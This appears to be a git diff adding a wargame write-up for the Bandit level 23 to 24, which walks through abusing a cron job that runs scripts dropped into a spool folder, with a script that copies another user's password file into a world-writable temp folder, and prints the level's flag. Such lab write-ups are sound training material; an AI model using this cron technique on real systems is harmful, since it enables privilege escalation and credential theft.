@@ -713,15 +713,71 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 
 ## Lvl 23 → 24
 
-**Goal:** 
+**Goal:** This level is similar to the one before, there is a cron job running, but this time we have to create a script of our own.
+
+As before, the first step is to change directory to `/etc/cron.d` and list its content.
 
 ```bash
-
+cd /etc/cron.d
+ls
 ```
 
-**Flag:** `` 
+Here we can find a file named `cronjob_bandit24`, let's print it.
 
-**Takeaway:** 
+```bash
+cat cronjob_bandit24
+```
+
+From the output of this file we understand that it runs a shell script, let's analyze the script by printing it to the screen.
+
+```bash
+cat /usr/bin/cronjob_bandit24.sh
+```
+
+By reading the script we find out that it runs all the scripts inside this folder `/var/spool/bandit24/foo` owned by `bandit23` and then it deletes the script, so let's make a temporary folder to work with and change directory into it.
+
+```bash
+mktemp -d
+cd /tmp/tmp.your_random_folder
+```
+
+Now let's create a script that can be executed, this can be done with `vim`, `nano` or `echo`.
+
+```bash 
+vim script.sh
+```
+
+This will be the script, at the top we put the `shebang` and below it are the commands to be executed.
+
+
+```bash
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.your_random_folder/password
+```
+
+Now let's set the right permissions to the script and also to the temp folder that is accessible only to us right now.
+
+```bash
+chmod 777 script.sh
+chmod 777 .
+```
+
+Now the last step is to copy the script to the right folder that we discovered before, and spam the `ls` command inside the temp folder until the `password` file appears.
+
+```bash
+cp ./script.sh /var/spool/bandit24/foo
+```
+
+When the `password` file appears, just print it.
+
+```bash 
+cat password
+```
+
+**Flag:** `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8` 
+
+**Takeaway:** In this level we learned how to create our first **script** and how to run it by setting the right permissions. 
 
 ---
 
